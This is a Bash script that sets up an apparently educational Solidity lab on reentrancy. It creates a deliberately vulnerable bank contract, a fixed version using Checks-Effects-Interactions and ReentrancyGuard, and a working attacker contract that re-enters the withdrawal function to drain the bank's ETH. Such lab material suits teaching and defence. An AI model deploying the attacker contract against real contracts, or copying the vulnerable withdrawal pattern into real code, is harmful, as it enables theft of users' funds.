#!/usr/bin/env bash
set -e
BASE=~/proyecto-cripto
echo ">> Creando estructura en $BASE"

mkdir -p $BASE/vulnerable/contracts/contracts
mkdir -p $BASE/vulnerable/backend
mkdir -p $BASE/vulnerable/frontend
mkdir -p $BASE/mitigada/contracts/contracts
mkdir -p $BASE/mitigada/backend
mkdir -p $BASE/mitigada/frontend
mkdir -p $BASE/ataques/contracts
mkdir -p $BASE/shared

# ---------- CONTRATO VULNERABLE ----------
cat > $BASE/vulnerable/contracts/contracts/Banco.sol << 'SOL'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Banco {
    mapping(address => uint256) public saldos;

    function depositar() external payable {
        saldos[msg.sender] += msg.value;
    }

    // VULNERABLE: envia el ETH antes de actualizar el saldo
    function retirar() external {
        uint256 monto = saldos[msg.sender];
        require(monto > 0, "Sin saldo");

        (bool ok, ) = msg.sender.call{value: monto}("");
        require(ok, "Fallo el envio");

        saldos[msg.sender] = 0;
    }

    function balanceContrato() external view returns (uint256) {
        return address(this).balance;
    }
}
SOL

# ---------- CONTRATO MITIGADO ----------
cat > $BASE/mitigada/contracts/contracts/Banco.sol << 'SOL'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract Banco is ReentrancyGuard {
    mapping(address => uint256) public saldos;

    function depositar() external payable {
        saldos[msg.sender] += msg.value;
    }

    // MITIGADO: Checks-Effects-Interactions + nonReentrant
    function retirar() external nonReentrant {
        uint256 monto = saldos[msg.sender];
        require(monto > 0, "Sin saldo");

        saldos[msg.sender] = 0;

        (bool ok, ) = msg.sender.call{value: monto}("");
        require(ok, "Fallo el envio");
    }

    function balanceContrato() external view returns (uint256) {
        return address(this).balance;
    }
}
SOL

# ---------- CONTRATO ATACANTE ----------
cat > $BASE/ataques/contracts/Atacante.sol << 'SOL'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBanco {
    function depositar() external payable;
    function retirar() external;
}

contract Atacante {
    IBanco public banco;
    address public owner;

    constructor(address _banco) {
        banco = IBanco(_banco);
        owner = msg.sender;
    }

    function atacar() external payable {
        require(msg.value >= 1 ether, "Envia al menos 1 ETH");
        banco.depositar{value: 1 ether}();
        banco.retirar();
    }

    receive() external payable {
        if (address(banco).balance >= 1 ether) {
            banco.retirar();
        }
    }

    function retirarBotin() external {
        payable(owner).transfer(address(this).balance);
    }
}
SOL

echo ">> Listo. Proyecto creado en $BASE"
echo ">> Contratos: vulnerable, mitigado y atacante."
echo ">> Siguiente: backend, frontend y Docker (te los paso aparte)."
